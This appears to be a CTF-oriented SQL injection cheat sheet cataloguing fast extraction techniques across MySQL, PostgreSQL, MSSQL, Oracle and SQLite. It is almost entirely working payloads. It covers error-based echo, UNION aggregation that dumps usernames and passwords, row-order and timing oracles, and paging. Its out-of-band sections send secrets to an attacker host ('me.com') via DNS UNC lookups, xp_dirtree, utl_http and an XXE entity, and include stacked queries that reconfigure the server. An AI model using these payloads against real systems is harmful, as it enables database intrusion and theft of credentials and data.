# Advanced extraction — faster than one-bit-per-request

Boolean blind default = ~8 requests per character (binary search).
When the response channel allows it, these techniques pull whole
strings per request — orders of magnitude faster. This file is the
"extract at speed" catalogue; `boolean-blind.md` is the fallback
when nothing here fires.

Ranking: error-echo > UNION > dns-oob > row-diff > charset tricks >
binary search.

---

## 1. Error-echo — the one-request extraction

The DB error message carries the data — one request per value:

```sql
-- MySQL extractvalue/updatexml (XPath echo):
' AND extractvalue(1,concat(0x7e,(SELECT flag FROM secrets)))-- -
' AND updatexml(1,concat(0x7e,(SELECT flag FROM secrets)),1)-- -
→ "XPATH syntax error: '~flag{...}'"

-- MySQL dup-key (value appears in 'Duplicate entry'):
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM
   secrets),FLOOR(RAND(0)*2))x FROM information_schema.tables
   GROUP BY x)a)-- -
→ "Duplicate entry 'flag{...}1' for key 'group_key'"

-- MySQL BIGINT overflow (value in the error):
' AND (SELECT !(x-~0) FROM (SELECT (SELECT flag FROM secrets)x)a)-- -
→ "BIGINT UNSIGNED value is out of range in '(not(...))'"
' AND (SELECT 1e308*10*(SELECT flag FROM secrets))-- -   -- rare
' AND EXP(~(SELECT flag FROM secrets))-- -

-- PG cast error:
' AND 1=CAST((SELECT flag FROM secrets LIMIT 1) AS int)-- -
→ "invalid input syntax for type integer: "flag{...}""
' AND (SELECT flag FROM secrets)::int=1-- -

-- PG error-via-JSON/array:
' AND (SELECT flag FROM secrets)::jsonb ? 'x'-- -       -- rare

-- MSSQL convert error:
' AND 1=CONVERT(int,(SELECT TOP 1 flag FROM secrets))-- -
→ "Conversion failed when converting the nvarchar value 'flag{...}'"
' AND 1 in (SELECT TOP 1 flag FROM secrets)-- -           -- some drivers

-- MSSQL raiserror trick (stacked):
'; DECLARE @x nvarchar(4000); SELECT @x=flag FROM secrets;
   RAISERROR(@x,16,1);-- -

-- Oracle: utl_inaddr echoes the hostname resolution attempt:
' AND 1=utl_inaddr.get_host_name((SELECT flag FROM secrets
   WHERE ROWNUM=1))-- -
→ "ORA-29257: host flag{...} unknown"

-- SQLite: rare echo — but pragma/json errors surface in some drivers:
' AND 1=(SELECT CAST(flag AS int) FROM secrets)-- -        -- no echo
' AND (SELECT flag FROM secrets) REGEXP 'x'-- -            -- fn missing error
```

Length limits:

- extractvalue/updatexml echo: ~32 chars of the payload visible
  (the error truncates) → `SUBSTRING(...,n,32)` to page.
- dup-key echo: ~64 chars.
- CAST/CONVERT echo: usually the whole value (PG/MSSQL) — the best.
- utl_inaddr: ~60 chars.

Paging recipe — wrap the value in `SUBSTRING`/`SUBSTR`/`MID` so
each request emits the next chunk:

```sql
' AND extractvalue(1,concat(0x7e,MID((SELECT flag FROM secrets),1,32)))-- -
' AND extractvalue(1,concat(0x7e,MID((SELECT flag FROM secrets),33,32)))-- -
' AND CAST(SUBSTRING((SELECT TOP 1 flag FROM secrets),1,100) AS int)-- -
' AND CAST(SUBSTRING((SELECT flag FROM secrets LIMIT 1),101,100)
   AS int)-- -   -- PG
```

---

## 2. UNION direct — rows per request

`union.md` covers finding it; the extraction-order question is what
goes in the reflected slot:

```sql
' UNION SELECT NULL,group_concat(username,0x3a,password),NULL FROM users-- -
' UNION SELECT NULL,string_agg(flag,','),NULL FROM secrets-- -          -- PG
' UNION SELECT NULL,(SELECT flag FROM secrets FOR XML PATH('')),NULL-- -  -- MSSQL
' UNION SELECT NULL,listagg(flag,',') WITHIN GROUP (ORDER BY 1),NULL
   FROM secrets-- -                                                      -- Oracle
' UNION SELECT NULL,group_concat(flag),NULL FROM secrets-- -             -- SQLite
```

Aggregating everything into ONE cell beats row-per-request — the
whole table lands in one response. Separators matter: pick bytes
unlikely in data (`0x7c` `|` `0x3a` `:` `\n` via `char(10)`),
then split client-side.

---

## 3. Row-order oracle — boolean signal via sort, not content

When the response only shows ROWS (no reflected value), ORDER BY
injection lets row order encode the answer — `edge-contexts.md` §4
covers the mechanics; here is the extraction recipe:

```sql
-- rows: 'alice','bob','carol' — if cond, sort by id else by name
sort=if(cond,id,name)
-- reading first row tells you cond's truth in ONE request
```

Extraction loop:

```text
for each char position i:
  binary search: cond = ascii(substring(secret,i,1)) > N
  observe which row renders first → bit value
```

Same cost as classic boolean blind, works when the ONLY signal is
which row comes first — `edge-contexts.md` §4.

---

## 4. Charset tricks — fewer requests per character

When the alphabet is known (`flag{[a-z0-9_]+}` = ~39 chars), binary
search over 39 chars = ~6 requests/char. Optimisations:

- `REGEXP '^prefix[c]'` — pattern-prefix confirms work on the whole
  suffix at once:

  ```sql
  ' AND (SELECT flag FROM secrets) REGEXP '^flag{[a-f]'-- -
  -- one request tests 'is next char in a-f' → faster than binary
  ```

- `LIKE 'flag{a%'` — same prefix-extension trick:

  ```sql
  ' AND (SELECT flag FROM secrets) LIKE 'flag{a%'-- -
  ```

- `IN ('a','b','c',...)` — test a charset slice in ONE request:

  ```sql
  ' AND SUBSTRING((SELECT flag FROM secrets),7,1)
     IN ('0','1','2','3','4','5','6','7')-- -     -- digits in one shot
  ' AND SUBSTRING(secret,7,1) BETWEEN 'a' AND 'm'-- -    -- range halves
  ```

- `BETWEEN` on hex strings — flags are often hex; the alphabet is
  16 chars → 4 requests/char max, and `REGEXP '^[0-9a-f]{4}'`
  confirms prefix+length together.

- `instr()`/`position()` — "where does X first appear":

  ```sql
  ' AND instr((SELECT flag FROM secrets),'f')=1-- -       -- position of 'f'
  ' AND position('f' in (SELECT flag FROM secrets))=1-- - -- PG
  ```

- `hex()` whole-string compare on SQLite:

  ```sql
  ' AND hex(substr((SELECT flag FROM secrets),1,4))='666c6167'-- -
  ```

---

## 5. Length-first — shrink the search space

```sql
' AND LENGTH((SELECT flag FROM secrets))>30-- -
' AND LENGTH((SELECT flag FROM secrets))=38-- -
' AND char_length((SELECT flag FROM secrets))=38-- -
' AND (SELECT octet_length(flag) FROM secrets)=38-- -     -- PG bytes
```

Knowing the exact length (e.g. 38 for `flag{...}`) bounds the loop
— and often the flag shape itself tells you the charset.

---

## 6. DNS OOB — one request per chunk when outbound is open

`oob.md` covers the transports; the extraction recipe:

```sql
-- MySQL (Windows only for UNC):
' AND LOAD_FILE(CONCAT('\\\\',HEX(SUBSTRING(
   (SELECT flag FROM secrets),1,20)),'.me.com\\x'))-- -
→ DNS lookup for '666c61677b....me.com' — chunk arrives in YOUR log

-- PG:
' AND (SELECT dblink_connect('host='||(SELECT flag FROM secrets)
   ||'.me.com user=u dbname=d'))-- -
-- dblink only if extension installed; else:
'; COPY t(x) FROM PROGRAM 'nslookup '||quote via shell... -- careful

-- MSSQL UNC:
'; DECLARE @x varchar(8000); SELECT @x=flag FROM secrets;
   EXEC master..xp_dirtree '\\'+@x+'.me.com\x';-- -
'; EXEC master..xp_fileexist '\\'+(SELECT flag)+'.me.com\x';-- -

-- Oracle:
' AND 1=utl_inaddr.get_host_address((SELECT flag FROM secrets)
   ||'.me.com')-- -
' AND 1=utl_http.request('http://'||(SELECT flag FROM secrets)
   ||'.me.com/')-- -
' AND 1=dbms_ldap.init((SELECT flag FROM secrets)||'.me.com',80)-- -
' AND 1=(SELECT extractvalue(xmltype(
   '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM
   "http://me/'||(SELECT flag FROM secrets)||'.me.com">]><r>&x;</r>'),
   '/r') FROM dual)-- -
```

63-char label limit per DNS label — chunk accordingly.

---

## 7. HTTP OOB — when the server fetches

```sql
-- MSSQL via OPENROWSET/httpd (weird but real):
'; EXEC sp_configure 'show advanced',1; RECONFIGURE;
   EXEC sp_configure 'Ad Hoc Distributed Queries',1; RECONFIGURE;-- -

-- Oracle UTL_HTTP direct:
' AND 1=utl_http.request('http://me/'||rawtohex(
   (SELECT flag FROM secrets)))-- -

-- MySQL via LOAD_FILE UNC only on Windows; Linux MySQL can't do
-- UNC but CAN do http through a federated/connect table? no —
-- Linux MySQL OOB = DNS-via-LOAD_FILE? NO: LOAD_FILE('//x') on
-- Linux tries a local path — Linux MySQL has NO easy http OOB.
-- Accept DNS-via-UNC = Windows-only for MySQL.
```

---

## 8. Boolean-compression — answer length shrunk

When alphabet is 39 chars: 8-bit binary search is wasteful. Prune:

```text
flag{...}   → 5 chars known, alphabet ≈ [a-z0-9_}
hex strings → alphabet 16 chars → 4 bits per char
base64      → alphabet 64 → 6 bits per char
```

Search-order the alphabet by observed frequency (CTF flags use
mostly lowercase+digits) — `REGEXP` with the likeliest range first
cuts average requests/char to ~4.

---

## 9. Multi-row paging — extract the whole table

```sql
-- page through rows:
(SELECT flag FROM secrets LIMIT 0,1)   then LIMIT 1,1 ...
(SELECT flag FROM secrets ORDER BY id LIMIT n,1)

-- or via keyset (faster, no OFFSET scan):
(SELECT flag FROM secrets WHERE id>5 ORDER BY id LIMIT 1)

-- MSSQL:
(SELECT TOP 1 flag FROM secrets ORDER BY id)
(SELECT flag FROM secrets ORDER BY id OFFSET 5 ROWS FETCH NEXT 1 ROWS ONLY)

-- Oracle:
(SELECT flag FROM (SELECT flag,ROWNUM r FROM secrets) WHERE r=5)
```

`group_concat`/`string_agg`/`listagg`/`for xml` beats all of it
when the cell limit allows — §2.

---

## 10. The timing shortcut — time-based echo channels

When time blind but a value renders in a stored/dedup location:

- Stored comment containing the extracted chunk (second-order
  readback — `second-order.md`)
- A `sleep(cond)` per bit vs `error-echo` per chunk — prefer echo.

Time-side compression: extract MULTIPLE bits per delay — e.g.
`sleep(k)` where k encodes 3 bits → measure delay length, not just
delay/no-delay:

```sql
' AND SLEEP(ASCII(SUBSTRING((SELECT flag),1,1)) MOD 8)-- -
-- delay 0-7s = 3 bits per request
' AND SLEEP(ORD(SUBSTRING(secret,1,1))-96)-- -   -- 'a'..'z' = 1..26s
   -- variable delay = whole char per request!
' AND SLEEP(ascii(substring(secret,1,1)))-- -     -- direct value
```

Delay-length encoding is underrated — a 0-127s delay IS a byte.
Keep delay ceilings low in CTF (`% 10`, `% 8`).

---

## 11. Multi-channel summary

| Channel | Req/char | When |
|---|---|---|
| error-echo | ~1 chunk | error text surfaced |
| UNION agg | whole table | reflected UNION col |
| OOB | 1 chunk | outbound DNS/HTTP open |
| sort oracle | ~6-8 | ORDER BY injection |
| LIKE-prefix | ~4-6 | charset known |
| IN-set | ~3-5 | alphabet sliced |
| binary search | ~8 | default blind |
| delay-length | ~1 | time-only oracle |
| regexp prefix | ~5-6 | pattern-matching exists |

Use the fastest channel that fires — don't reach for binary search
until everything above it has been falsified.
